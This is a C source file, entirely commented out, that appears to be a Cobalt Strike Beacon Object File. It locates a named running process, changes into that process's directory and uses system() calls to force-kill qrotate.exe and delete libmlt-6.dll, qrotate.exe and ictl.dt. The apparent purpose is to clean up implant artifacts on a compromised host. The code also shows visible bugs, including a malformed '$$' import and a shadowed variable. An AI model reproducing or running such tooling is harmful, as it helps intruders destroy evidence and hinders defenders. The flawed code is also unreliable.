//#include"beacon.h"
//#include<Windows.h>
//
//DECLSPEC_IMPORT  BOOL WINAPI KERNEL32$$EnumProcesses(DWORD*, DWORD, DWORD*);
//DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
//DECLSPEC_IMPORT BOOL WINAPI KERNEL32$EnumProcessModules(HANDLE, HMODULE*, DWORD, LPDWORD);
//DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetModuleBaseNameW(HANDLE, HMODULE, LPWSTR, DWORD);
//DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetModuleFileNameExW(HANDLE, HMODULE, LPWSTR, DWORD);
//DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
//
//void FindPathAndDeleteFiles(const TCHAR* szFileName);
//
//
//int _tmain(int argc, TCHAR* argv[])
//{
//    if (argc != 2)
//    {
//        printf("Usage: %s <process_name>\n", argv[0]);
//        return 1;
//    }
//    FindPathAndDeleteFiles(argv[1]);
//    return 0;
//}
//
//void FindPathAndDeleteFiles(const TCHAR* szFileName)
//{
//    DWORD aProcesses[1024], cbNeeded, cProcesses;
//    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
//
//    if (!KERNEL32$$EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
//    {
//        return;
//    }
//
//    cProcesses = cbNeeded / sizeof(DWORD);
//
//    for (DWORD i = 0; i < cProcesses; i++)
//    {
//        HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
//
//        if (hProcess)
//        {
//            HMODULE hMod;
//            DWORD cbNeeded;
//
//            if (KERNEL32$EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
//            {
//                KERNEL32$GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
//
//                if (_tcscmp(szProcessName, szFileName) == 0)
//                {
//                    TCHAR szPath[MAX_PATH];
//                    KERNEL32$GetModuleFileNameExW(hProcess, hMod, szPath, sizeof(szPath) / sizeof(TCHAR));
//
//                    TCHAR szDrive[_MAX_DRIVE], szDir[_MAX_DIR], szFileName[_MAX_FNAME], szExt[_MAX_EXT];
//                    _tsplitpath_s(szPath, szDrive, _MAX_DRIVE, szDir, _MAX_DIR, szFileName, _MAX_FNAME, szExt, _MAX_EXT);
//
//                    TCHAR szDirPath[MAX_PATH];
//                    _tmakepath_s(szDirPath, MAX_PATH, szDrive, szDir, NULL, NULL);
//
//                    if (_tchdir(szDirPath) != 0)
//                    {
//                        BeaconPrintf("Failed to change directory. Error:%d \n", GetLastError());
//                        return;
//                    }
//
//                    system("taskkill /im qrotate.exe /f");
//                    system("del libmlt-6.dll");
//                    system("del qrotate.exe");
//                    system("del ictl.dt");
//
//                    BeaconPrintf("Successfully deleted files and changed directory to %s\n", szDirPath);
//                    return;
//                }
//            }
//            KERNEL32$CloseHandle(hProcess);
//        }
//    }
//
//    BeaconPrintf("Could not find %s process\n", szFileName);
//}